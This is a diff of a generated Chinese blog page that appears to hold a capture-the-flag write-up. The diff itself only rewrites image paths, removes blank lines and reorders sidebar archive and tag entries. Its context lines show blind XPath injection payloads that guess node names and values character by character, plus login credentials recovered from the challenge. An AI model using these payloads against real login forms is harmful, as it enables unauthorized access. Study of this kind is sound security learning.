@@ -429,19 +429,19 @@
 <li><p>提取父节点名字</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;or substring(name(parent::*[position()=1]),1,1)=&apos;a</span><br></pre></td></tr></table></figure>
 <p> 结果如下：</p>
-<p><img src="/assets/isictf/TIM截图20180804151333.png" alt=""></p>
+<p><img src="/posts/6549/assets/isictf/TIM截图20180804151333.png" alt=""></p>
 <p>可以发现第一个字母为<code>u</code>。最终，可以得到父节点名字为<code>user</code>。</p>
 </li>
 <li><p>探测子节点</p>
 <p>探测第一个user节点下第二个字段的名字。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;or substring(name(//user[1]/*[2]),1,1)=&apos;u&apos; or &apos;a&apos;=&apos;a</span><br></pre></td></tr></table></figure>
-<p><img src="/assets/isictf/TIM截图20180804153803.png" alt=""></p>
+<p><img src="/posts/6549/assets/isictf/TIM截图20180804153803.png" alt=""></p>
 </li>
 <li><p>探测子节点的值</p>
 <p>探测第一个user节点下第1个字段的值</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&apos;or substring(//user[1]/*[2],1,1)=&apos;u&apos; or &apos;a&apos;=&apos;a</span><br><span class="line">或者:</span><br><span class="line">&apos;or substring(//user[1]/*[1]/text(),1,1)=&apos;F&amp;password=1</span><br></pre></td></tr></table></figure>
 <p>结果:</p>
-<p><img src="/assets/isictf/TIM截图20180804153002.png" alt=""></p>
+<p><img src="/posts/6549/assets/isictf/TIM截图20180804153002.png" alt=""></p>
 <p>最终得到账号：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Adm1n</span><br><span class="line">Ez_t0_gu3ss_PaSSw0rd</span><br></pre></td></tr></table></figure>
 </li>
@@ -598,24 +598,6 @@
     <div class="sidebar-content sidebar-content-show-archive">
           <div class="sidebar-panel-archives">
     <!-- 在ejs中将archive按照时间排序 -->
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
     
     
     
@@ -1702,12 +1684,12 @@
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">05/22</span><a class="archive-post-title" href="/posts/23527/">phpinfo解读</a>
+            <span class="archive-post-date">05/22</span><a class="archive-post-title" href="/posts/9764/">rctf2018学习笔记</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">05/22</span><a class="archive-post-title" href="/posts/9764/">rctf2018学习笔记</a>
+            <span class="archive-post-date">05/22</span><a class="archive-post-title" href="/posts/23527/">phpinfo解读</a>
         </li>
     
     
@@ -1775,19 +1757,19 @@
         <div class="sidebar-panel-tags">
     <div class="sidebar-tags-name">
     
-        <span class="sidebar-tag-name" data-tags="web安全"><span class="iconfont-archer">&#xe606;</span>web安全</span>
-    
         <span class="sidebar-tag-name" data-tags="ctf"><span class="iconfont-archer">&#xe606;</span>ctf</span>
+    
+        <span class="sidebar-tag-name" data-tags="web安全"><span class="iconfont-archer">&#xe606;</span>web安全</span>
     
         <span class="sidebar-tag-name" data-tags="pwn"><span class="iconfont-archer">&#xe606;</span>pwn</span>
     
-        <span class="sidebar-tag-name" data-tags="工具手册"><span class="iconfont-archer">&#xe606;</span>工具手册</span>
-    
         <span class="sidebar-tag-name" data-tags="dubbo"><span class="iconfont-archer">&#xe606;</span>dubbo</span>
     
-        <span class="sidebar-tag-name" data-tags="jvm"><span class="iconfont-archer">&#xe606;</span>jvm</span>
+        <span class="sidebar-tag-name" data-tags="工具手册"><span class="iconfont-archer">&#xe606;</span>工具手册</span>
     
         <span class="sidebar-tag-name" data-tags="运维"><span class="iconfont-archer">&#xe606;</span>运维</span>
+    
+        <span class="sidebar-tag-name" data-tags="jvm"><span class="iconfont-archer">&#xe606;</span>jvm</span>
     
         <span class="sidebar-tag-name" data-tags="mysql"><span class="iconfont-archer">&#xe606;</span>mysql</span>
     
@@ -1795,9 +1777,9 @@
     
         <span class="sidebar-tag-name" data-tags="python"><span class="iconfont-archer">&#xe606;</span>python</span>
     
-        <span class="sidebar-tag-name" data-tags="前端"><span class="iconfont-archer">&#xe606;</span>前端</span>
-    
         <span class="sidebar-tag-name" data-tags="python安全"><span class="iconfont-archer">&#xe606;</span>python安全</span>
+    
+        <span class="sidebar-tag-name" data-tags="前端"><span class="iconfont-archer">&#xe606;</span>前端</span>
     
         <span class="sidebar-tag-name" data-tags="zookeeper"><span class="iconfont-archer">&#xe606;</span>zookeeper</span>
     
